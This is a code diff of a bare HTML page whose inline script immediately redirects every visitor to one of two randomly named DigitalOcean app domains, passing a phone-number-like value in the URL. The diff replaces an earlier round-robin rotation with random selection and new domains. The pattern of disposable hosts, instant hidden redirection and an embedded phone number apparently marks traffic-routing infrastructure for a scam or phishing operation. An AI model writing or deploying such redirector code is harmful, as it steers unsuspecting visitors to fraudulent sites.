@@ -1,5 +1,3 @@
-<?php
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,20 +6,15 @@
 
 <script>
 (function () {
-    const urls = [
-        "https://hammerhead-app-ocxv4.ondigitalocean.app/?bcda=(050)-3097-5847",
-        "https://octopus-app-2-abzee.ondigitalocean.app/?bcda=(050)-3097-5847"
-    ];
+    const domainA = "https://coral-app-794bn.ondigitalocean.app/?bcda=(050)-3097-5847";
+    const domainB = "https://orca-app-rx88o.ondigitalocean.app/?bcda=(050)-3097-5847";
 
-    // Get current index (default 0)
-    let index = localStorage.getItem("strict_redirect");
-    index = index === null ? 0 : Number(index);
-
-    // Prepare next visit BEFORE redirect
-    localStorage.setItem("strict_redirect", (index + 1) % urls.length);
-
-    // INSTANT redirect (no delay)
-    window.location.replace(urls[index]);
+    // Random number between 0 and 1
+    if (Math.random() < 0.5) {
+        window.location.replace(domainA);
+    } else {
+        window.location.replace(domainB);
+    }
 })();
 </script>
 
